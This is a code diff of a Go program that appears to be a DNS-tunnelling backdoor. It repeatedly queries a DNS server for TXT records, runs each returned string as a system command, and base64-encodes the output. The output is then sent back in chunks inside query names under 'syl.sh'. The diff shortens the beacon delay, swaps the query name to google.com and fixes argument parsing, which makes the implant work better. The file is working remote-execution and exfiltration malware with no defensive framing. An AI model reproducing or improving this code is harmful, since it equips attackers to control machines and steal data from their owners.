@@ -8,52 +8,47 @@ import (
 	"strings"
 	"time"
 
-	"github.com/denisbrodbeck/machineid"
 	"github.com/miekg/dns"
 )
 
 const (
 	host        = "127.0.0.1:8053"
 	maxMsgLen   = 66
-	metaInfoLen = 20
-	beaconTime  = 20 * time.Second
-)
-
-// QueryStrings META
-const (
-	machineIdQs    = "mid="
-	outputQs       = "o="
-	chunkLenQs     = "cs="
-	currentChunkQs = "cc="
+	metaInfoLen = 30
+	delay       = 500 * time.Millisecond
 )
 
 func main() {
-	machineId, _ := machineid.ID()
-	messageFormat := fmt.Sprintf("microsoft.com?mid=%s.", machineId)
 	m := new(dns.Msg)
-	m.SetQuestion(messageFormat, dns.TypeTXT)
+	m.SetQuestion("google.com.", dns.TypeTXT)
 
 	for {
-		r, _ := dns.Exchange(m, host)
+		// Do you Have something for me?
+		r, err := dns.Exchange(m, host)
+		if err != nil {
+			fmt.Println("cannot reach the server")
+		}
 		if r != nil {
 			for _, a := range r.Answer {
 				if txt, ok := a.(*dns.TXT); ok {
+					if txt.Txt[0] == "" {
+						break
+					}
+
 					cmd := strings.Split(txt.Txt[0], " ")
 					cmdToExecute := cmd[0]
-					cmdArgs := cmd[0:]
-					fmt.Printf("cmd: %s\n", cmdToExecute)
-					// Execute and Encode the received command
-					out, err := exec.Command(cmdToExecute, cmdArgs...).Output()
+					cmdArgs := cmd[1:]
+					fmt.Println(cmd)
+
+					nm := new(dns.Msg)
+
+					out, err := exec.Command(cmdToExecute, cmdArgs...).CombinedOutput()
 					if err != nil {
 						fmt.Println(err)
+						out = []byte(" ")
 					}
 					outEnc := base64.StdEncoding.EncodeToString(out)
-
 					baseUrl := "syl.sh"
-
-					// Add Machine Id
-					baseUrl = baseUrl + "?" + machineIdQs + machineId[:4]
-					nm := new(dns.Msg)
 
 					// Add Space for META inf
 					dataLeft := (maxMsgLen - len(baseUrl)) - metaInfoLen
@@ -65,9 +60,9 @@ func main() {
 
 						// Build the Chunk URL
 						chunkUrl := baseUrl +
-							"&" + chunkLenQs + chunkLen +
-							"&" + currentChunkQs + currentChunk +
-							"&" + outputQs + chunkOut +
+							"?" + "cs=" + chunkLen +
+							"&" + "cc=" + currentChunk +
+							"&" + "o=" + chunkOut +
 							"."
 
 						fmt.Println(chunkUrl)
@@ -80,8 +75,7 @@ func main() {
 				}
 			}
 		}
-
-		time.Sleep(beaconTime)
+		time.Sleep(delay)
 	}
 }
 
